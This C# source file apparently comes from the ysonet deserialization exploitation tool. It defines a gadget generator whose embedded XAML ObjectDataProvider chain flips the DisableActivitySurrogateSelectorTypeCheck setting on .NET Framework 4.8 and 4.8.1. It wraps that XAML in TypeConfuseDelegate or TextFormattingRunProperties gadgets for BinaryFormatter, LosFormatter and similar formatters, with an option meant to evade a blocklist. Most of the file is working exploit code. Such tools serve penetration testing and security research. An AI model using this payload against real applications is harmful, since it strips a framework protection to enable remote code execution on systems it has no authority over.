using NDesk.Options;
using System.Collections.Generic;
using ysonet.Helpers;

namespace ysonet.Generators
{
    public class ActivitySurrogateDisableTypeCheckGenerator : GenericGenerator
    {
        // Discovery facets (category search only): does not run a user command; it
        // flips a config flag to disable ActivitySurrogateSelector's type check. That
        // known result fits no broad family, so kind is "other". Uses WPF and
        // framework types. Variant 2 (TextFormattingRunProperties) additionally needs
        // Microsoft.PowerShell.Editor (declared as a variant override below).
        //
        // The type check this turns off is the 4.8+ protection, so 4.8 and 4.8.1 are
        // the builds where the payload has a job to do. On an older build the
        // protection is not there to disable.
        public override GadgetFacetSet Facets()
        {
            return new GadgetFacetSet()
                .WithKinds(PayloadKind.Other)
                .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.Wpf,
                    GadgetRequirement.NetFramework)
                .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx48, RuntimeVersion.NetFx481));
        }

        public override string AdditionalInfo()
        {
            // Kept short on purpose: this text is the interactive info panel's first
            // block, and a long one pushes the formatter/input/category lines off the
            // panel. The full story lives in the rootcontainer option help.
            return "Disables 4.8+ type protections for ActivitySurrogateSelector, command is ignored. "
                + "Variant 1 also takes rootcontainer (1 SortedSet, 2 SortedDictionary, 3 TreeSet) "
                + "to dodge a SortedSet wire-name blocklist, and self-tests in a child process.";
        }

        public override CommandInputType CommandInput()
        {
            return CommandInputType.Ignored;
        }

        public override List<GadgetVariant> Variants()
        {
            return new List<GadgetVariant>
            {
                // Variant 1 wraps the XAML in TypeConfuseDelegate, whose gadget object is
                // a generic sorted container (SortedSet by default; the container option
                // can swap it for SortedDictionary or TreeSet, both generic too).
                // SoapFormatter cannot serialize a generic type, so this variant opts out
                // of SoapFormatter for every container (variant 2,
                // TextFormattingRunProperties, is not generic and serializes fine).
                new GadgetVariant(1, "TypeConfuseDelegate wrapper (default)").Without(Formatters.SoapFormatter),
                new GadgetVariant(2, "TextFormattingRunProperties wrapper")
                    // No sorted container in this wrapper, so the root-container option
                    // does not apply and the editor stops offering it.
                    .WithoutOptions(TypeConfuseDelegateGenerator.XamlRootContainerOptionName)
                    // A variant override REPLACES the gadget's whole facet set, so it
                    // repeats the 4.8+ version support as well as the requirements.
                    .WithFacets(new GadgetFacetSet()
                        .WithKinds(PayloadKind.Other)
                        .WithRequirements(GadgetRequirement.ExtraAssembly, GadgetRequirement.Wpf,
                            GadgetRequirement.NetFramework)
                        .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx48, RuntimeVersion.NetFx481)))
            };
        }

        public override string Finders()
        {
            return "Nick Landers";
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTags.Hosted };
        }

        public override List<string> SupportedFormatters()
        {
            // The "(N)" suffix is a display-only annotation meaning "this formatter
            // carries N variants". SoapFormatter has no suffix because only variant 2
            // supports it (variant 1 is a generic SortedSet; see Variants()).
            return new List<string> { "BinaryFormatter (2)", "SoapFormatter", "NetDataContractSerializer (2)", "LosFormatter (2)" };
        }

        int variant_number = 1;

        // Serialized root container of the TypeConfuseDelegate wrapper. Orthogonal to
        // variant_number, which picks the WRAPPER, so it gets its own option instead of
        // overloading --variant (the same split ObjectDataProvider uses for --variant and
        // --xamlurl). Variant 2 declares it unused in Variants().
        int root_container_number = 1;

        public override OptionSet Options()
        {
            OptionSet options = new OptionSet()
            {
                {"var|variant=", "Choices: 1 -> use TypeConfuseDelegateGenerator [default], 2 -> use TextFormattingRunPropertiesMarshal", v => int.TryParse(v, out variant_number) },
                {TypeConfuseDelegateGenerator.XamlRootContainerOptionName + "=",
                    TypeConfuseDelegateGenerator.XamlRootContainerOptionHelp,
                    v => root_container_number = TypeConfuseDelegateGenerator.ParseXamlRootContainerOption(v) },
            };

            return options;
        }

        // Variant 1 hands its XAML to XamlReader.Parse from inside a deserialization
        // callback, which fail-fasts the CLR after the payload has fired (see
        // Helpers/Core/IsolatedSelfTest.cs). Its -t self-test therefore runs in a child
        // process. Variant 2 (TextFormattingRunProperties) is unaffected.
        public override bool SelfTestNeedsChildProcess(string formatter, InputArgs inputArgs)
        {
            return variant_number == 1;
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            // Reject an impossible variant+formatter pair (e.g. variant 1 + SoapFormatter)
            // with a clear message instead of a deep framework exception.
            GuardVariantFormatter(variant_number, formatter);

            string xaml_payload = @"<ResourceDictionary
xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation""
xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml""
xmlns:s=""clr-namespace:System;assembly=mscorlib""
xmlns:c=""clr-namespace:System.Configuration;assembly=System.Configuration""
xmlns:r=""clr-namespace:System.Reflection;assembly=mscorlib"">
    <ObjectDataProvider x:Key=""type"" ObjectType=""{x:Type s:Type}"" MethodName=""GetType"">
        <ObjectDataProvider.MethodParameters>
            <s:String>System.Workflow.ComponentModel.AppSettings, System.Workflow.ComponentModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35</s:String>
        </ObjectDataProvider.MethodParameters>
    </ObjectDataProvider>
    <ObjectDataProvider x:Key=""field"" ObjectInstance=""{StaticResource type}"" MethodName=""GetField"">
        <ObjectDataProvider.MethodParameters>
            <s:String>disableActivitySurrogateSelectorTypeCheck</s:String>
            <r:BindingFlags>40</r:BindingFlags>
        </ObjectDataProvider.MethodParameters>
    </ObjectDataProvider>
    <ObjectDataProvider x:Key=""set"" ObjectInstance=""{StaticResource field}"" MethodName=""SetValue"">
        <ObjectDataProvider.MethodParameters>
            <s:Object/>
            <s:Boolean>true</s:Boolean>
        </ObjectDataProvider.MethodParameters>
    </ObjectDataProvider>
    <ObjectDataProvider x:Key=""setMethod"" ObjectInstance=""{x:Static c:ConfigurationManager.AppSettings}"" MethodName =""Set"">
        <ObjectDataProvider.MethodParameters>
            <s:String>microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck</s:String>
            <s:String>true</s:String>
        </ObjectDataProvider.MethodParameters>
    </ObjectDataProvider>
</ResourceDictionary>";

            if (inputArgs.Minify)
            {
                xaml_payload = XmlMinifier.Minify(xaml_payload, null, null);
            }

            object payload;
            if (variant_number == 1)
            {
                // TypeConfuseDelegate wrapper: a generic sorted container (see
                // GetXamlGadget), so SoapFormatter is opted out for this variant above.
                payload = TypeConfuseDelegateGenerator.GetXamlGadget(xaml_payload, root_container_number);
            }
            else
            {
                payload = new TextFormattingRunPropertiesMarshal(xaml_payload);
            }

            return Serialize(payload, formatter, inputArgs);
        }

    }
}
